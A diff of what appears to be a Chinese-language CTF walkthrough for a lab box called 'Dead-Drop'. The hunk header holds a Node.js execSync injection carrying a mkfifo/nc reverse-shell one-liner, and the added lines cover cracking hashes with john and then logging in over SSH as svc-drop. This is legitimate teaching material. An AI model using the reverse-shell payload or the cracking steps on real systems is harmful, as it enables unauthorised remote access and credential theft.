@@ -86,4 +86,9 @@ throw new Error(execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ip 44
 查看`backup`我们发现用户`svc-drop`，以及一些哈希值
 ![截图](./Dead-Drop/13.png)
 
-将哈希值保存到本地`hash.txt`里然后用`john`进行爆破
+将哈希值保存到本地`hash.txt`里然后用`john`进行爆破，差不多10分钟出结果
+![截图](./Dead-Drop/14.png)
+
+## 以 svc-drop 身份访问ssh
+
+我们测试了凭据，并尝试通过 SSH 登录到 Web 服务器，登录成功。在用户主目录中，我们找到了一个 backup 目录。
